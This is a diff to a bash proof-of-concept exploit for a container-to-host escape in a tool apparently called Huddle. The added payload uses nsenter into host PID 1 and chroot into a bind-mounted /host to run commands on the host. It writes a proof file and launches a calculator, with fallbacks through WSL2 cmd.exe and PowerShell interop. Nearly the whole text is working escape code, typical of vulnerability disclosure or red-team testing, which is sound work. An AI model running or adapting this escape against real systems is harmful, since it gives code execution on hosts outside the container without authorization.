@@ -41,26 +41,63 @@ STAMP="poc-$$"                       # unique-ish tag; no Date.now needed
 PROOF="/tmp/huddle-host-escape-${STAMP}.txt"
 
 # ── The payload that runs INSIDE the escaping container ───────────────────────
-# The host root fs is bind-mounted at /host and we share the host PID namespace,
-# so `nsenter -t 1 -a` executes in host init's namespaces = on the host.
-# Try GUI calculators (Linux + WSL/Windows), then always write a proof file.
-read -r -d '' PAYLOAD <<PAYLOAD_EOF || true
-set +e
-# 1) proof of host-side execution (works headless)
-{
-  echo "HUDDLE HOST-ESCAPE PoC ($STAMP)"
-  echo "ran in host namespaces as: \$(nsenter -t 1 -m -u -i -n -p -- id 2>/dev/null || id)"
-  echo "host uname: \$(nsenter -t 1 -m -u -i -n -p -- uname -a 2>/dev/null || uname -a)"
-  echo "host /etc/hostname: \$(cat /host/etc/hostname 2>/dev/null)"
-} > "/host$PROOF" 2>/dev/null
-# 2) pop calc on the host (best-effort across environments)
-nsenter -t 1 -m -u -i -n -p -- sh -c '
-  for c in "cmd.exe /c start calc" gnome-calculator kcalc xcalc "calc.exe"; do
-    DISPLAY="\${DISPLAY:-:0}" \$c >/dev/null 2>&1 && exit 0
+# The host root fs is bind-mounted at /host and we share the host PID namespace.
+# Alpine busybox has no nsenter — install util-linux first.
+# WSL2: Windows interop needs explicit paths to cmd.exe/powershell.exe.
+read -r -d '' PAYLOAD <<'PAYLOAD_EOF' || true
+set -x
+
+# alpine busybox has no nsenter
+if ! command -v nsenter >/dev/null 2>&1; then
+  echo "[*] installing nsenter (util-linux) ..."
+  apk add --no-cache util-linux >/dev/null 2>&1 || echo "[!] apk add failed"
+fi
+
+PROOF="PROOF_PLACEHOLDER"
+
+# ── 1) write proof via nsenter (host namespaces) ─────────────
+echo "[*] nsenter into host PID 1 ..."
+if nsenter -t 1 -m -u -i -n -p -- sh -c "
+  echo 'HUDDLE HOST-ESCAPE PoC' > '$PROOF'
+  id >> '$PROOF'
+  uname -a >> '$PROOF'
+  hostname >> '$PROOF'
+"; then
+  echo "[+] proof written to host:$PROOF via nsenter"
+else
+  echo "[!] nsenter failed — using chroot /host"
+  chroot /host sh -c "
+    echo 'HUDDLE HOST-ESCAPE PoC (chroot)' > '$PROOF'
+    id >> '$PROOF'
+    uname -a >> '$PROOF'
+    hostname >> '$PROOF'
+  " && echo "[+] proof written to host:$PROOF via chroot"
+fi
+
+# ── 2) pop calc ──────────────────────────────────────────────
+if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
+  echo "[*] WSL2 detected — launching calc via Windows interop"
+  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
+    && echo "[+] calc launched (nsenter+cmd.exe)" && exit 0
+  chroot /host /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
+    && echo "[+] calc launched (chroot+cmd.exe)" && exit 0
+  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
+    -Command "Start-Process calc" 2>&1 \
+    && echo "[+] calc launched (powershell)" && exit 0
+  chroot /host /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
+    -Command "Start-Process calc" 2>&1 \
+    && echo "[+] calc launched (chroot+powershell)" && exit 0
+  echo "[!] all WSL2 calc methods failed — check proof file: $PROOF"
+else
+  echo "[*] native Linux — launching calc"
+  for c in gnome-calculator kcalc xcalc xterm; do
+    DISPLAY="${DISPLAY:-:0}" nsenter -t 1 -m -u -i -n -p -- "$c" >/dev/null 2>&1 \
+      && echo "[+] launched $c" && exit 0
   done
-' 2>/dev/null
-echo "payload done; proof at (host) $PROOF"
+  echo "[!] no GUI calc found — check proof file: $PROOF"
+fi
 PAYLOAD_EOF
+PAYLOAD="${PAYLOAD//PROOF_PLACEHOLDER/$PROOF}"
 
 # ── Make sure the image is present (image pull is allowed through the proxy) ──
 echo "[*] pulling $IMAGE via proxy ..."
